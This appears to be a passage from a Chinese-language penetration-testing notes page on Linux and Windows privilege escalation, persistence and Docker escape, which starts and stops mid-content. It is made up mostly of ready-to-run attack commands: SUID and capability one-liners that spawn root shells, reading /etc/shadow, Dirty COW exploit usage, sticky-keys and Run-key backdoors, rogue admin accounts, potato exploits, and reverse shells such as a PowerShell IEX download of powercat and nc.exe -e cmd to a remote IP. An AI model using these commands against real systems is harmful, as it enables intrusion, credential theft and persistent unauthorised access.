class="hljs-string">&quot;http://题目/api.php?m=upload&amp;a=upfile&amp;adminid=&amp;device=1625923765752&amp;cfrom=mweb&amp;token=&amp;sysmodenum=officia&amp;sysmid=0&amp;maxsize=2&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>[TOC]</p><h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>内核设备信息：</p><p>uname -a 打印所有可用的系统信息</p><p>uname -r 内核版本</p><p>uname -n 系统主机名。</p><p>uname -m 查看系统内核架构（64位&#x2F;32位）</p><p>hostname 系统主机名</p><p>cat &#x2F;proc&#x2F;version 内核信息 cat &#x2F;etc&#x2F;*-release 分发信息 cat &#x2F;etc&#x2F;issue 分发信息</p><p>cat &#x2F;proc&#x2F;cpuinfo CPU信息用户和群组信息：</p><p>cat &#x2F;etc&#x2F;passwd 列出系统上的所有用户</p><p>cat &#x2F;etc&#x2F;group 列出系统上的所有组</p><p>grep -v -E “^#” &#x2F;etc&#x2F;passwd | awk -F: ‘$3 &#x3D;&#x3D; 0 { print $1}’ 列出所有的超级用户账户</p><p>whoami 查看当前用户</p><p>w 谁目前已登录，他们正在做什么</p><p>last 最后登录用户的列表</p><p>lastlog 所有用户上次登录的信息</p><p>lastlog -u %username% 有关指定用户上次登录的信息</p><p>lastlog |grep -v “Never” 以前登录用户的信息</p><p>history</p><p>cat &#x2F;home&#x2F;<user>&#x2F;.bash_history</p><p>cat ~&#x2F;.bash_history | grep -i passw</p><p>用户和权限信息：</p><p>whoami 当前用户名</p><p>id 当前用户信息</p><p>cat &#x2F;etc&#x2F;sudoers 谁被允许以root身份执行 sudo -l 当前用户可以以root身份执行操作 环境系统变量信息：</p><p>env 显示环境变量</p><p>set 现实环境变量</p><p>echo %PATH 路径信息</p><p>history 显示当前用户的历史命令记录</p><p>pwd 输出工作目录</p><p>cat &#x2F;etc&#x2F;profile 显示默认系统变量</p><p>cat &#x2F;etc&#x2F;shells 显示可用的shell</p><h2 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h2><p><a href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a></p><p>转储hash，有可能获得铭文密码。</p><h2 id="suid"><a href="#suid" class="headerlink" title="suid"></a>suid</h2><h3 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h3><p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p><p>find &#x2F; -user root -perm -4000 -exec ls -ldb {} ;</p><p>常见的可以提权的程序:</p><p>nmap vim find Bash More Less Nano cp netcat</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>linux： <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><p>windows：</p><p><a href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a></p><p><strong>修改PATH</strong></p><p>假如有以下suid程序：</p><p>system(“cat &#x2F;flag”);</p><p>可以修改PATH来让root运行我们的cat。</p><p>export PATH&#x3D;&#x2F;tmp &amp;&amp; &#x2F;exp</p><p>&#x2F;tmp&#x2F;cat中为恶意程序</p><h2 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h2><h3 id="探测-1"><a href="#探测-1" class="headerlink" title="探测"></a>探测</h3><p>Linux系统中可以使用sudo执行一个只有root才能执行的命令，配置文件保存在&#x2F;etc&#x2F;sudoers，sudo -l可以列出当前用户支持sudo的命令。</p><h2 id="cap"><a href="#cap" class="headerlink" title="cap"></a>cap</h2><p>我们运行SUID的命令时，通常只是需要使用一小部分特权，但是使用SUID，却可以拥有root用户的全部权限。所以，一旦SUID的文件存在漏洞，便可能被利用，以root身份执行其他操作。</p><p>SUID的问题，主要在于权限控制太粗糙。为了对root身份进行更加精细的控制，Linux增加了另一种机制，即 capabilities。</p><h3 id="探测-2"><a href="#探测-2" class="headerlink" title="探测"></a>探测</h3><p>getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null</p><p>利用</p><p><strong>gdb</strong></p><p>gdb -nx -ex ‘python import os; os.setuid(0)’ -ex ‘!sh’ -ex quit</p><p><strong>perl</strong></p><p>perl -e ‘use POSIX qw(setuid); POSIX::setuid(0); exec “&#x2F;bin&#x2F;sh”;’</p><p><strong>php</strong></p><p>php -r “posix_setuid(0); system(‘&#x2F;bin&#x2F;sh’);”</p><p><strong>python</strong></p><p>python -c ‘import os; os.setuid(0); os.system(“&#x2F;bin&#x2F;sh”)’</p><p><strong>ruby</strong></p><p>ruby -e ‘Process::Sys.setuid(0); exec “&#x2F;bin&#x2F;sh”‘</p><p><strong>rvim</strong></p><p>rvim -c ‘:py import os; os.setuid(0); os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-c”, “reset; exec sh”)’</p><p><strong>vim</strong></p><p>vim -c ‘:py import os; os.setuid(0); os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-c”, “reset; exec sh”)’</p><p><strong>tar</strong> cap_dac_read_search可以绕过文件的读权限检查以及目录的读&#x2F;执行权限的检查，利用此特性我们可以读取系统中的敏感信息。</p><p>tar -vcf root.tar &#x2F;root</p><p><strong>openssl</strong> 建立http服务器，通过http越权下载文件</p><h1 id="使用openssl生成证书"><a href="#使用openssl生成证书" class="headerlink" title="使用openssl生成证书"></a>使用openssl生成证书</h1><p>┌──(kali㉿kali)-[&#x2F;]</p><p>└─$ openssl req -x509 -newkey rsa:2048 -keyout &#x2F;tmp&#x2F;key.pem -out &#x2F;tmp&#x2F;cert.pem - days 365 -nodes</p><h1 id="进入系统根目录下"><a href="#进入系统根目录下" class="headerlink" title="进入系统根目录下"></a>进入系统根目录下</h1><p>┌──(kali㉿kali)-[&#x2F;]</p><p>└─$ cd &#x2F;</p><h1 id="启动web服务器，监听8080端口"><a href="#启动web服务器，监听8080端口" class="headerlink" title="启动web服务器，监听8080端口"></a>启动web服务器，监听8080端口</h1><p>┌──(kali㉿kali)-[&#x2F;]</p><p>└─$ openssl s_server -key &#x2F;tmp&#x2F;key.pem -cert &#x2F;tmp&#x2F;cert.pem -port 8080 -HTTP</p><h1 id="访问本机的web服务，读取-etc-shadow文件"><a href="#访问本机的web服务，读取-etc-shadow文件" class="headerlink" title="访问本机的web服务，读取&#x2F;etc&#x2F;shadow文件"></a>访问本机的web服务，读取&#x2F;etc&#x2F;shadow文件</h1><p>┌──(kali㉿kali)-[~]</p><p>└─$ curl –http0.9 -k “<a href="https://127.0.0.1:8080/etc/shadow">https://127.0.0.1:8080/etc/shadow</a>“ root:!:18681:0:99999:7:::</p><p>daemon:<em>:18681:0:99999:7::: bin:</em>:18681:0:99999:7:::</p><p>sys:*:18681:0:99999:7:::</p><p>sync:*:18681:0:99999:7:::</p><h2 id="内核漏洞"><a href="#内核漏洞" class="headerlink" title="内核漏洞"></a>内核漏洞</h2><h3 id="探测-3"><a href="#探测-3" class="headerlink" title="探测"></a>探测</h3><p><strong>linux-exploit-suggester</strong></p><p>详见工具.md</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><strong>Linux</strong></p><p>常见漏洞详见tools&#x2F;linux-kernel-exploits</p><p>大部分exp需要自己编译。使用docker的交叉编译环境(<a href="https://github.com/dockcross/dockcross">https://github.com/dockcross/dockcross</a>)</p><p><strong>dirty cow</strong></p><p><a href="https://dirtycow.ninja/">https://dirtycow.ninja/</a> 交叉编译.受影响版本：</p><p>Centos7&#x2F;RHEL7</p><p>Cetnos6&#x2F;RHEL6 Ubuntu 16.10</p><p>Ubuntu 16.04</p><p>Ubuntu 14.04</p><p>Debian 8</p><p>Debian 7</p><p>3.10.0-327.36.3.el7</p><p>2.6.32-642.6.2.el6</p><p>4.8.0-26.28</p><p>4.4.0-45.66</p><p>3.13.0-100.147</p><p>3.16.36-1+deb8u2</p><p>3.2.82-1</p><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>Link</strong></td><td><strong>Usage</strong></td><td><strong>Description</strong></td><td><strong>Family</strong></td></tr><tr><td>dirtyc0w.c</td><td>.&#x2F;dirtyc0w file content</td><td>Read-only write</td><td>&#x2F;proc&#x2F;self&#x2F;mem</td></tr><tr><td>cowroot.c</td><td>.&#x2F;cowroot</td><td>SUID-based root</td><td>&#x2F;proc&#x2F;self&#x2F;mem</td></tr></tbody></table><p>dirtycow- mem.c</p><p>.&#x2F;dirtycow-mem libc-based root &#x2F;proc&#x2F;self&#x2F;mem</p><p>pokemon.c .&#x2F;d file content Read-only write PTRACE_POKEDATA dirtyc0w.c .&#x2F;dirtycow file content Read-only write (Android) &#x2F;proc&#x2F;self&#x2F;mem</p><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>dirtycow.rb</td><td>use exploit&#x2F;linux&#x2F;local&#x2F;dirtycow and run</td><td>SUID-based root</td><td>&#x2F;proc&#x2F;self&#x2F;mem</td></tr><tr><td>0xdeadbeef.c</td><td>.&#x2F;0xdeadbeef</td><td>vDSO-based root</td><td>PTRACE_POKEDATA</td></tr><tr><td>naughtyc0w.c</td><td>.&#x2F;c0w suid</td><td>SUID-based root</td><td>&#x2F;proc&#x2F;self&#x2F;mem</td></tr><tr><td>c0w.c</td><td>.&#x2F;c0w</td><td>SUID-based root</td><td>PTRACE_POKEDATA</td></tr></tbody></table><p>mucow.c .&#x2F;mucow destination &lt; payload.exe Read-only write (multi</p><p>page)</p><p>PTRACE_POKEDATA</p><p>dcow.cpp .&#x2F;dcow &#x2F;etc&#x2F;passwd based root &#x2F;proc&#x2F;self&#x2F;mem</p><p>dirtyc0w.go go run dirtyc0w.go -f&#x3D;file - c&#x3D;content</p><p>Read-only write &#x2F;proc&#x2F;self&#x2F;mem</p><p>dirty.c .&#x2F;dirty &#x2F;etc&#x2F;passwd based root PTRACE_POKEDATA</p><p><strong>Windows</strong></p><p><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741499482710-3a53ba34-98de-4cef-865b-d86c085ae606.png"> &#x2F;var&#x2F;spool&#x2F;cron&#x2F; 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741499482922-1c3f60a0-2aad-46b1-b4a1-32441ef9b50a.png"> &#x2F;etc&#x2F;crontab 这个文件负责调度各种管理和维护任务。</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741499483091-c92ae9d8-05d5-4ba6-a51b-2750b5202ef7.png"> &#x2F;etc&#x2F;cron.d&#x2F; 这个目录用来存放任何要执行的crontab文件或脚本。 <img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741499483257-8a6842bc-2954-46ca-ab01-ed8ab59ee1a8.png"> 我们还可以把脚本放</p><p>在&#x2F;etc&#x2F;cron.hourly、&#x2F;etc&#x2F;cron.daily、&#x2F;etc&#x2F;cron.weekly、&#x2F;etc&#x2F;cron.monthly目录中，让它每小时&#x2F;天&#x2F;星期、月执行一次。</p><ul><li><ul><li><ul><li><ul><li><ul><li>user Command #每分钟 #分、时、日、月、周</li></ul></li></ul></li></ul></li></ul></li></ul><h3 id="软连接"><a href="#软连接" class="headerlink" title="软连接"></a>软连接</h3><p>*<strong>作用</strong></p><p>sh中*会自动解析成当前目录下所有文件名：</p><p>#!&#x2F;bin&#x2F;bash echo @$;</p><p>.&#x2F;test.sh *</p><h1 id="输出当前文件夹下所有文件名"><a href="#输出当前文件夹下所有文件名" class="headerlink" title="输出当前文件夹下所有文件名"></a>输出当前文件夹下所有文件名</h1><p>可以用于参数注入，比如tar *&#x2F;cp *</p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><p>useradd newuser;echo “newuser:password”|chpasswd</p><p>添加suoder</p><p>修改 &#x2F;etc&#x2F;sudoers 文件，找到下面一行，在root下面添加一行，如下所示：</p><p>root ALL&#x3D;(ALL) ALL</p><p><username> ALL&#x3D;(ALL) ALL</p><h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><p><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p><h2 id="Runas"><a href="#Runas" class="headerlink" title="Runas"></a>Runas</h2><p>RUNAS 用法:</p><p>RUNAS [ [&#x2F;noprofile | &#x2F;profile] [&#x2F;env] [&#x2F;savecred | &#x2F;netonly] ] &#x2F;user:<UserName> program</p><p>runas &#x2F;noprofile &#x2F;user:mymachine\administrator cmd</p><p>说明：使用本机上的Administrator管理员身份执行CMD，&#x2F;noprofile为不加载该用户的配置信息。</p><p>runas &#x2F;profile &#x2F;env &#x2F;user:mydomain\admin “mmc %windir%\system32\dsa.msc”</p><p>说明：使用本机上的admin身份扫行msc控制台。 &#x2F;profile为指定加载用户配置文件。 &#x2F;env 表示使用当前环境。</p><p>runas &#x2F;env <a href="mailto:&#x75;&#115;&#101;&#114;&#x40;&#x64;&#111;&#109;&#x61;&#105;&#110;&#46;&#109;&#105;&#99;&#114;&#x6f;&#115;&#x6f;&#102;&#116;&#x2e;&#x63;&#x6f;&#x6d;">&#x2F;user:user@domain.microsoft.com</a> “notepad \”my file.txt\””</p><p>说明：使用域用户身份运行，并指定使用notepad打开my file.txt文档。 RunasCs是第三方的升级工具：</p><p>允许显式凭证</p><p>无论是从交互进程还是从服务进程生成，都可以工作正确管理窗口站和桌面的DACL以创建新进程</p><p>使用更可靠的创建进程函数，例如CreateProcessAsUser()，CreateProcessWithTokenW()如果调用进程拥有所需的权限（自动检测）</p><p>允许指定登录类型，例如 8-NetworkCleartext 登录（无UAC限制）当知道管理员密码时允许绕过 UAC（标志 –bypass-uac）</p><p>允许创建一个主线程模拟请求用户的进程（标志–remote-impersonation）允许将stdin、stdout和stderr重定向到远程主机</p><p>它是开源的:)</p><p><a href="https://github.com/antonioCoco/RunasCs">https://github.com/antonioCoco/RunasCs</a></p><p>kali&#x2F;tools&#x2F;pentest&#x2F;priv&#x2F;windows-exe&#x2F;runascs</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>powershell工具： powercat.ps1</p><p>powershell IEX (New-Object</p><p>System.Net.Webclient).DownloadString(‘<a href="http://ip:port/powercat.ps1">http://ip:port/powercat.ps1</a>‘); powercat -c IP -p 端口 -e cmd</p><h3 id="无文件后门"><a href="#无文件后门" class="headerlink" title="无文件后门"></a>无文件后门</h3><p>memfd_create 是 Linux 中的一个系统调用，用于创建一个内存文件描述符。这个文件描述符可以用于共享内存、匿名内存映射或其他与文件无关的 I&#x2F;O 操作。</p><p>int memfd_create(const char *name, unsigned int flags);</p><p>&#x2F;&#x2F; name：一个可选的名称，用于标识这个内存文件描述符。如果设置为NULL，则使用默认名称。</p><p>&#x2F;&#x2F; flags：用于指定创建的内存文件描述符的特性。例如，可以使用 MFD_CLOEXEC 和</p><p>MFD_ALLOW_SEALING 等标志。</p><h2 id="内核溢出漏洞提权"><a href="#内核溢出漏洞提权" class="headerlink" title="内核溢出漏洞提权"></a>内核溢出漏洞提权</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741499483426-ac77b13a-be40-4aa1-a213-556857ea667b.png"> msf</p><p>dos命令</p><p>post&#x2F;windows&#x2F;gather&#x2F;enum_applications 查看系统可能存在的可以利用的漏洞</p><p>post&#x2F;windows&#x2F;gather&#x2F;enum_patches 查找系统中的补丁信息。</p><p>post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester</p><p>Windows Exploit Suggester</p><p>chcp 437 # 将语言设为英文</p><p>systeminfo</p><p>Wmic qfe get Caption,Description,HotFixID,InstalledOn # 查看windows机器上安装了多少补丁</p><p>schtasks &#x2F;query &#x2F;fo LIST &#x2F;v # 查看计划任务</p><h1 id="将systeminfo保存到文件"><a href="#将systeminfo保存到文件" class="headerlink" title="将systeminfo保存到文件"></a>将systeminfo保存到文件</h1><p>python2 windows-exploit-suggester.py –update # 更新漏洞数据库</p><p>python2 windows-exploit-suggester.py -d &lt;漏洞库文件&gt; -i sysinfo.txt</p><h2 id="Getsystem"><a href="#Getsystem" class="headerlink" title="Getsystem"></a>Getsystem</h2><p>msf:</p><p>meterpreter &gt; getsystem</p><h2 id="UAC提权"><a href="#UAC提权" class="headerlink" title="UAC提权"></a>UAC提权</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741499483585-c2bf641b-c755-4bd7-818b-2424c644f975.png"> msf</p><p>windows&#x2F;local&#x2F;bypassuac模块 <img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741499483742-4d66f526-aa1d-4198-be64-b0bfa07aac32.png"> 注册表</p><p>注意 windows 2008 及以上系统在默认情况下开启 UAC 策略, 不允许 administrator 以外的其它本地管理员用户访问远程资源.</p><p>可通过更改注册表关闭 UAC 策略.</p><p>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</p><h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><p>msf:</p><p>use incognito #进入incognito模块 list_tokens -u #列出令牌</p><p>impersonate_token “WIN-HN02RO8B2OU\86158” #模仿令牌（它没有扫描处我的靶机里面的 system权限的用户，所以我将就模仿）</p><h2 id="windows-系统配置错误提权"><a href="#windows-系统配置错误提权" class="headerlink" title="windows 系统配置错误提权"></a>windows 系统配置错误提权</h2><h3 id="系统服务权限配置错误"><a href="#系统服务权限配置错误" class="headerlink" title="系统服务权限配置错误"></a>系统服务权限配置错误</h3><p>windows系统服务文件在操作系统启动时加载执行，并在后台调用可执行文件。如果一个低权限的用户对此类系统服务调用的可执行文件拥有写权限，那么就可以替换该文件，并随着系统启动获得控制权限。</p><p>msf</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;service_permissions</p><p>service_permissions模块会使用 两种方式获取system权限 如果以管理员权限运行 会尝试创建并运行一个新的服务 如果当前权限不允许创建服务 会判断哪些服务的文件或文件夹的权限有问题 并对其进行劫持 在劫持服务时会创建一个可执行程序 其文件名和安装路径都是随机的</p><h3 id="注册表键AlwaysInstallElevated"><a href="#注册表键AlwaysInstallElevated" class="headerlink" title="注册表键AlwaysInstallElevated"></a>注册表键AlwaysInstallElevated</h3><p>允许低权限用户以System权限安装文件。如果启用此策略设置项，那么任何权限的用户都以NT Authority\System权限来安装恶意的MSI文件。</p><p>该模块会创建一个文件名随机的MSI文件 并在提权后删除所有已部署的文件</p><p>msf:</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;always_install_elevated</p><h3 id="自动安装配置文件"><a href="#自动安装配置文件" class="headerlink" title="自动安装配置文件"></a>自动安装配置文件</h3><p>网络管理员在内网中给多台机器配置同一个环境时，通常不会逐个配置，而是使用脚本批量部署。在这个过程中，会使用安装配置文件。这些文件中包含所有的安装配置信息，其中一些还可能包含管理员账号和密码</p><p>msf:</p><p>use post&#x2F;windows&#x2F;gather&#x2F;enum_unattend</p><h3 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a>组策略首选项提权</h3><p>msf:</p><p>use post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp</p><h3 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h3><p>注册表当前用户可修改。</p><p>注册表路径下IFEO（image file execution options）的exe程序被修改，然后进行重定向执行门程序的过程,也就是说你在执行A程序时候，由于IFEO劫持的原因执行了B程序</p><h1 id="RDP登录界面按Windows-键-U，获得一个SYSTEM权限的-cmd-exe"><a href="#RDP登录界面按Windows-键-U，获得一个SYSTEM权限的-cmd-exe" class="headerlink" title="RDP登录界面按Windows 键+U，获得一个SYSTEM权限的 cmd.exe"></a>RDP登录界面按Windows 键+U，获得一个SYSTEM权限的 cmd.exe</h1><blockquote><p>REG ADD “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe” &#x2F;t REG_SZ &#x2F;v Debugger &#x2F;d “C:\windows\system32\cmd.exe” &#x2F;f</p></blockquote><h1 id="在-RDP-登录屏幕时按多次shift"><a href="#在-RDP-登录屏幕时按多次shift" class="headerlink" title="在 RDP 登录屏幕时按多次shift"></a>在 RDP 登录屏幕时按多次shift</h1><blockquote><p>REG ADD “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe” &#x2F;t REG_SZ &#x2F;v Debugger &#x2F;d “C:\windows\system32\cmd.exe” &#x2F;f</p></blockquote><p>启动项：</p><blockquote><p>reg add “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run” &#x2F;v Evil</p></blockquote><p>&#x2F;t REG_SZ &#x2F;d “C:\Users\user\backdoor.exe”</p><blockquote><p>reg add “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce” &#x2F;v Evil &#x2F;t REG_SZ &#x2F;d “C:\Users\user\backdoor.exe”</p></blockquote><blockquote><p>reg add “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices”</p></blockquote><p>&#x2F;v Evil &#x2F;t REG_SZ &#x2F;d “C:\Users\user\backdoor.exe”</p><blockquote><p>reg add</p></blockquote><p>“HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce” &#x2F;v Evil &#x2F;t REG_SZ &#x2F;d “C:\Users\user\backdoor.exe”</p><h3 id="service劫持"><a href="#service劫持" class="headerlink" title="service劫持"></a>service劫持</h3><p>修改以高权限用户执行的服务的imagepath。通过sc命令启动服务。</p><p>reg修改注册表</p><h2 id="power-up"><a href="#power-up" class="headerlink" title="power up"></a>power up</h2><p>使用 PowerUp 脚本可以快速的帮助我们发现系统弱点，从而实现提权的目的。</p><p>其中PowerUp.ps1文件可从这里下载：<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a> beacon:</p><p>powershell-import PowerUp.ps1 powershell invoke-allchecks</p><p>如果在自己的靶机上发现导入ps1文件失败，这可能是因为系统不允许执行不信任的脚本文件导致的。</p><p>这时为了复现成功可以来到靶机下，以管理员权限打开 Powershell，运行set-ExecutionPolicy RemoteSigned，输入Y回车，此时系统便能导入PowerUp.ps1文件了。</p><h2 id="potato系列提权"><a href="#potato系列提权" class="headerlink" title="potato系列提权"></a>potato系列提权</h2><h3 id="Hot-potato"><a href="#Hot-potato" class="headerlink" title="Hot potato"></a>Hot potato</h3><p><a href="https://github.com/Kevin-Robertson/Tater">https://github.com/Kevin-Robertson/Tater</a></p><p>Import-Module .\Tater.ps1</p><p>Invoke-Tater -Command “whoami”</p><h3 id="Rotten-Potato-JuicyPotato"><a href="#Rotten-Potato-JuicyPotato" class="headerlink" title="Rotten Potato &amp; JuicyPotato"></a>Rotten Potato &amp; JuicyPotato</h3><p><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p><p>在指定 ip 和端口的位置尝试加载一个 COM 对象</p><p>RottenPotatoNG 使用的 COM 对象为 BITS，CLSID 为 {4991d34b-80a1-4291-83b6-3328366b9097}可供选择的 COM 对象不唯一，Juicy Potato 提供了多个，详细列表可参考如下地址： <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a></p><p>RottenPotatoNG 使用的 135 端口</p><p>Juicy Potato 支持指定任意本地端口，但是 RPC 一般默认为135端口，很少被修改</p><p>clsid参考列表: <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a></p><p>JuicyPotato.exe -t * -l 1112 -p exp.bat</p><p>参数</p><p>T:&gt;JuicyPotato.exe JuicyPotato v0.1</p><p>Mandatory args:</p><p>-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, &lt;*&gt; try both</p><p>-p <program>: program to launch</p><p>-l <port>: COM server listen port</p><p>Optional args:</p><p>-m <ip>: COM server listen address (default 127.0.0.1)</p><p>-a <argument>: command line argument to pass to program (default NULL)</p><p>-k <ip>: RPC server ip address (default 127.0.0.1)</p><p>-n <port>: RPC server listen port (default 135)</p><p>-c &lt;{clsid}&gt;: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})</p><p>-z only test CLSID and print token’s user</p><p>可以根据系统选择clsid，test_clsid.bat可以测试可用的clsid（<a href="https://github.com/ohpe/juicy-">https://github.com/ohpe/juicy-</a> potato&#x2F;blob&#x2F;master&#x2F;Test&#x2F;test_clsid.bat）</p><h3 id="PrintSpoofer-PipePotato-or-BadPotato"><a href="#PrintSpoofer-PipePotato-or-BadPotato" class="headerlink" title="PrintSpoofer (PipePotato or BadPotato)"></a>PrintSpoofer (PipePotato or BadPotato)</h3><p><a href="https://github.com/itm4n/PrintSpoofer">https://github.com/itm4n/PrintSpoofer</a></p><p>PrintSpoofer.exe -c “C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd”</p><h3 id="RoguePotato"><a href="#RoguePotato" class="headerlink" title="RoguePotato"></a>RoguePotato</h3><p><a href="https://github.com/antonioCoco/RoguePotato">https://github.com/antonioCoco/RoguePotato</a></p><h1 id="先在vps上监听端口"><a href="#先在vps上监听端口" class="headerlink" title="先在vps上监听端口"></a>先在vps上监听端口</h1><p>socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999</p><p>{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}” -p splintercode</p><table><thead><tr><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td># 或者nc<br><br>while true; do nc -l -p 135 -c nc -l -p 135 | nc 0.0.0.0 9999</td><td>‘nc 0.0.0.0 9999’; done</td><td></td><td></td><td></td><td></td></tr><tr><td>RoguePotato.exe -r 10.0.0.3 -e</td><td>“C:\windows\system32\cmd.exe”</td><td>-l</td><td>9999</td><td></td><td></td></tr><tr><td># 或者自己选择clsid和管道<br><br>RoguePotato.exe -r 10.0.0.3 -e</td><td>“C:\windows\system32\cmd.exe”</td><td>-l</td><td>9999</td><td>-c</td><td>“</td></tr></tbody></table><h3 id="SweetPotato"><a href="#SweetPotato" class="headerlink" title="SweetPotato"></a>SweetPotato</h3><p>COM&#x2F;WinRM&#x2F;Spoolsv 的集合版，也就是 Juicy&#x2F;PrintSpoofer 的集合版 <a href="https://github.com/CCob/SweetPotato">https://github.com/CCob/SweetPotato</a> <a href="https://github.com/uknowsec/SweetPotato">https://github.com/uknowsec/SweetPotato</a></p><p>SweetPotato.exe -a “whoami”</p><h2 id="权限维持-1"><a href="#权限维持-1" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="添加用户-1"><a href="#添加用户-1" class="headerlink" title="添加用户"></a>添加用户</h3><p>添加高权限用户</p><p>net user <username> <password> &#x2F;add</p><p>net localgroup administrators fushuling &#x2F;add</p><p>登录以后以管理员权限运行cmd</p><p>powershell -Command “Start-Process cmd -Verb RunAs” exit</p><h1 id="或者"><a href="#或者" class="headerlink" title="或者"></a>或者</h1><p>echo <password> | runas &#x2F;user:administrator cmd exit</p><h1 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h1><h2 id="docker-sock挂载逃逸"><a href="#docker-sock挂载逃逸" class="headerlink" title="docker.sock挂载逃逸"></a>docker.sock挂载逃逸</h2><p><strong>Docker Client 和 Docker Daemon</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741499483915-bec315df-06bf-4e8f-a322-22b0c30a8714.png"> Docker Client：这是用户通过命令行与 Docker 进行交互的工具（例如你输入的 docker run 命令）。它提供了一个用户界面来管理 Docker 容器和镜像。</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741499484115-ed238339-1d1a-42cc-9c6a-192266447dd5.png"> Docker Daemon：后台运行的服务（进程），负责管理 Docker 容器的创建、运行、停止等操作。它接收来自 Docker Client 的请求，并处理这些请求。</p><p>需要挂载&#x2F;var&#x2F;run&#x2F;docker.sock，并在容器内安装docker。</p><p>挂载宿主机docker.sock后，使用docker运行容器等操作时连接的是宿主机的docker daemon。</p><p><strong>利用</strong></p><p>apt-get 